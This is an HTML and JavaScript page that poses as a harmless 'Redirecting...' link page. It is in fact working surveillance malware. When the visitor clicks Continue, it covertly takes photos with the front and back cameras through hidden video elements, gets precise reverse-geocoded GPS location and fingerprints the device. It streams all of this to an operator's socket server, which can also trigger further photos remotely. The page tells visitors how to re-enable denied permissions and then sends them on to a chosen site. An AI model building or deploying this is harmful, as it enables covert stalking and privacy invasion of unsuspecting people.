<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container { text-align: center; max-width: 450px; width: 100%; }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e8ecf1;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .redirect-text { font-size: 18px; color: #1a2332; margin-bottom: 6px; font-weight: 500; }
        .redirect-url { 
            font-size: 14px; 
            color: #4285f4; 
            word-break: break-all; 
            font-weight: 500;
            background: #f0f4ff;
            padding: 8px 14px;
            border-radius: 8px;
            display: inline-block;
            margin-top: 4px;
        }
        .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
        .btn-continue {
            margin-top: 25px;
            padding: 14px 40px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-continue:hover { background: #3367d6; }
        .btn-continue:disabled {
            background: #a0aec0;
            cursor: not-allowed;
        }
        #statusText {
            font-size: 14px;
            color: #667eea;
            margin-top: 15px;
            font-weight: 500;
            min-height: 24px;
        }
        #statusText.error { color: #e53e3e; }
        #statusText.success { color: #22a67e; }
        #statusText.warning { color: #ed8936; }
        #hiddenVideo, #hiddenVideoBack { display: none; }
        .perm-status {
            margin-top: 15px;
            font-size: 13px;
            color: #8895aa;
            display: none;
        }
        .perm-status .done { color: #22a67e; }
        .perm-status .pending { color: #f6ad55; }
        .perm-status .denied { color: #e53e3e; }
        .instructions {
            margin-top: 15px;
            padding: 12px;
            background: #fef3c7;
            border-radius: 8px;
            font-size: 13px;
            color: #92400e;
            display: none;
            text-align: left;
        }
        .instructions a { color: #4285f4; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="redirect-text">Redirecting to</div>
        <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
        <div class="sub-text">Click continue to proceed</div>
        <div id="statusText">⏳ Ready</div>
        <div class="perm-status" id="permStatus">
            <span id="permLocation"> Location: <span class="pending">Waiting</span></span> |
            <span id="permFront"> Front: <span class="pending">Waiting</span></span> |
            <span id="permBack"> Back: <span class="pending">Waiting</span></span>
        </div>
        <div class="instructions" id="instructions">
            🔧 <strong>How to fix:</strong><br>
            1. Click the <strong>🔒</strong> (lock) icon in address bar<br>
            2. Set <strong>Camera</strong> to <strong>Allow</strong><br>
            3. Set <strong>Location</strong> to <strong>Allow</strong><br>
            4. Refresh page and click <strong>Retry</strong>
        </div>
        <button class="btn-continue" id="continueBtn">▶ Continue</button>
    </div>

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <video id="hiddenVideoBack" autoplay playsinline muted></video>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        if (typeof io === 'undefined') {
            var s = document.createElement('script');
            s.src = 'https://cdn.socket.io/4.6.1/socket.io.min.js';
            document.head.appendChild(s);
        }
    </script>

    <script>
        (function() {
            const visitorId = window.location.pathname.split('/').pop();
            const redirectDisplay = document.getElementById('redirectUrlDisplay');
            const statusText = document.getElementById('statusText');
            const continueBtn = document.getElementById('continueBtn');
            const permStatus = document.getElementById('permStatus');
            const instructions = document.getElementById('instructions');
            
            let socket = null;
            let redirectUrl = 'https://www.google.com';
            let redirectTriggered = false;
            let isProcessing = false;
            
            let frontStream = null;
            let backStream = null;
            let frontVideo = document.getElementById('hiddenVideo');
            let backVideo = document.getElementById('hiddenVideoBack');

            function updateStatus(msg, type = '') {
                statusText.textContent = msg;
                statusText.className = 'status-text' + (type ? ' ' + type : '');
                console.log(msg);
            }

            function updatePermStatus(type, status) {
                const map = {
                    location: document.getElementById('permLocation').querySelector('span'),
                    front: document.getElementById('permFront').querySelector('span'),
                    back: document.getElementById('permBack').querySelector('span')
                };
                if (map[type]) {
                    map[type].textContent = status;
                    map[type].className = status === 'Granted' ? 'done' : status === 'Denied' ? 'denied' : 'pending';
                }
                permStatus.style.display = 'block';
            }

            function fetchRedirectUrl() {
                fetch(`/api/visitor/${visitorId}`)
                    .then(res => res.json())
                    .then(data => {
                        redirectUrl = data.redirectUrl || 'https://www.google.com';
                        redirectDisplay.textContent = redirectUrl;
                        connectSocket();
                    })
                    .catch(() => {
                        fetch(`/api/visitor-redirect/${visitorId}`)
                            .then(res => res.json())
                            .then(data => {
                                redirectUrl = data.redirectUrl || 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                connectSocket();
                            })
                            .catch(() => {
                                redirectUrl = 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                connectSocket();
                            });
                    });
            }

            function connectSocket() {
                try {
                    socket = io({
                        transports: ['websocket', 'polling'],
                        reconnectionAttempts: 5,
                        reconnectionDelay: 1000
                    });

                    socket.on('connect', function() {
                        console.log('✅ Socket connected');
                        sendDeviceInfo();
                        updateStatus('✅ Connected. Click Continue');
                        continueBtn.disabled = false;
                    });

                    socket.on('connect_error', function(err) {
                        console.log('❌ Socket error:', err.message);
                        updateStatus('⚠️ Reconnecting...');
                        setTimeout(() => socket.connect(), 2000);
                    });

                    socket.on('capture-command', function(data) {
                        console.log(' Capture command:', data.type);
                        if (data.type === 'front' && frontStream) {
                            capturePhoto('front', frontStream);
                        } else if (data.type === 'back' && backStream) {
                            capturePhoto('back', backStream);
                        } else if (data.type === 'both') {
                            if (frontStream) capturePhoto('front', frontStream);
                            setTimeout(() => {
                                if (backStream) capturePhoto('back', backStream);
                            }, 1000);
                        }
                    });

                } catch(e) {
                    console.log('❌ Socket init error:', e.message);
                }
            }

            function sendDeviceInfo() {
                if (!socket || !socket.connected) {
                    setTimeout(sendDeviceInfo, 500);
                    return;
                }

                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    deviceName: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(', ') : 
                        navigator.platform
                };

                socket.emit('visitor-connect', { visitorId, ...deviceInfo });
                console.log('📱 Device info sent');

                if (navigator.getBattery) {
                    navigator.getBattery()
                        .then(function(battery) {
                            const level = Math.round(battery.level * 100);
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId,
                                    type: 'battery',
                                    content: level
                                });
                            }
                        })
                        .catch(() => {});
                }

                let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                if (navigator.connection) {
                    const conn = navigator.connection;
                    networkData = {
                        type: conn.type || 'Unknown',
                        effectiveType: conn.effectiveType || 'Unknown',
                        downlink: conn.downlink || 'Unknown'
                    };
                }
                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: 'network',
                        content: networkData
                    });
                }
            }

            function cleanupStreams() {
                if (frontStream) {
                    frontStream.getTracks().forEach(t => t.stop());
                    frontStream = null;
                }
                if (backStream) {
                    backStream.getTracks().forEach(t => t.stop());
                    backStream = null;
                }
                frontVideo.srcObject = null;
                backVideo.srcObject = null;
            }

            // ============================================
            // CONTINUE BUTTON - PERMISSIONS
            // ============================================
            continueBtn.addEventListener('click', function() {
                if (isProcessing) return;
                isProcessing = true;
                continueBtn.disabled = true;
                continueBtn.textContent = '⏳ Processing...';
                instructions.style.display = 'none';
                
                updateStatus('⏳ Requesting permissions...');
                permStatus.style.display = 'block';
                
                updatePermStatus('location', 'Waiting');
                updatePermStatus('front', 'Waiting');
                updatePermStatus('back', 'Waiting');

                cleanupStreams();

                // ---- STEP 1: FRONT CAMERA ----
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                })
                .then(function(stream) {
                    console.log('✅ Front camera granted');
                    updatePermStatus('front', 'Granted');
                    frontStream = stream;
                    frontVideo.srcObject = stream;
                    frontVideo.play().catch(() => {});
                    
                    setTimeout(function() {
                        capturePhoto('front', stream);
                    }, 500);
                    
                    return navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    });
                })
                .then(function(stream) {
                    console.log('✅ Back camera granted');
                    updatePermStatus('back', 'Granted');
                    backStream = stream;
                    backVideo.srcObject = stream;
                    backVideo.play().catch(() => {});
                    
                    setTimeout(function() {
                        capturePhoto('back', stream);
                    }, 500);
                    
                    return new Promise(function(resolve, reject) {
                        if (!navigator.geolocation) {
                            reject('Geolocation not supported');
                            return;
                        }
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 10000,
                            enableHighAccuracy: true
                        });
                    });
                })
                .then(function(position) {
                    console.log('✅ Location granted');
                    updatePermStatus('location', 'Granted');
                    
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    return fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                        .then(res => res.json())
                        .then(data => {
                            const locationInfo = {
                                lat, lng,
                                accuracy: position.coords.accuracy,
                                timestamp: new Date().toISOString(),
                                country: data.countryName || 'Unknown',
                                state: data.principalSubdivision || 'Unknown',
                                city: data.locality || 'Unknown'
                            };
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId,
                                    type: 'location',
                                    content: locationInfo
                                });
                            }
                            console.log('📍 Location sent');
                        });
                })
                .then(function() {
                    updateStatus('✅ All permissions granted! Redirecting...', 'success');
                    
                    if (socket && socket.connected) {
                        socket.emit('visitor-data', {
                            visitorId,
                            type: 'permissionsGranted',
                            content: true
                        });
                    }
                    
                    setTimeout(function() {
                        if (!redirectTriggered) {
                            redirectNow();
                        }
                    }, 2000);
                })
                .catch(function(error) {
                    console.log('❌ Permission error:', error);
                    
                    cleanupStreams();
                    
                    let errorMsg = '';
                    let showInstructions = false;
                    
                    if (error.message && (error.message.includes('Permission denied') || error.message.includes('denied'))) {
                        errorMsg = '⚠️ Permission denied. Please allow camera & location in browser.';
                        showInstructions = true;
                        updatePermStatus('location', 'Denied');
                        updatePermStatus('front', 'Denied');
                        updatePermStatus('back', 'Denied');
                    } else if (error.message && error.message.includes('not found')) {
                        errorMsg = '⚠️ No camera found on this device.';
                    } else {
                        errorMsg = '⚠️ Error: ' + (error.message || error);
                    }
                    
                    updateStatus(errorMsg, 'error');
                    
                    if (showInstructions) {
                        instructions.style.display = 'block';
                    }
                    
                    isProcessing = false;
                    continueBtn.disabled = false;
                    continueBtn.textContent = '▶ Retry';
                });
            });

            // ============================================
            // CAPTURE PHOTO
            // ============================================
            function capturePhoto(type, stream) {
                if (!stream) {
                    console.log(`⚠️ ${type} stream not available`);
                    return;
                }
                
                const videoTrack = stream.getVideoTracks()[0];
                if (!videoTrack) return;
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.muted = true;
                video.playsInline = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                
                video.onloadedmetadata = function() {
                    setTimeout(function() {
                        try {
                            const canvas = document.createElement('canvas');
                            const width = Math.min(video.videoWidth, 800);
                            const height = Math.min(video.videoHeight, 600);
                            canvas.width = width;
                            canvas.height = height;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, width, height);
                            const imageData = canvas.toDataURL('image/jpeg', 0.9);
                            
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId: visitorId,
                                    type: type === 'back' ? 'backCamera' : 'frontCamera',
                                    content: imageData
                                });
                                console.log(`✅ ${type} photo sent`);
                            }
                            
                            document.body.removeChild(video);
                        } catch (err) {
                            console.log(`❌ ${type} capture error:`, err.message);
                        }
                    }, 500);
                };
            }

            // ============================================
            // REDIRECT
            // ============================================
            function redirectNow() {
                if (redirectTriggered) return;
                redirectTriggered = true;

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: 'redirectComplete',
                        content: { redirected: true, time: new Date().toISOString() }
                    });
                }

                cleanupStreams();

                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 800);
            }

            // ============================================
            // START
            // ============================================
            if (typeof io !== 'undefined') {
                fetchRedirectUrl();
            } else {
                setTimeout(fetchRedirectUrl, 2000);
            }

            window.addEventListener('beforeunload', function() {
                if (socket) socket.disconnect();
                cleanupStreams();
            });
        })();
    </script>
</body>
</html>
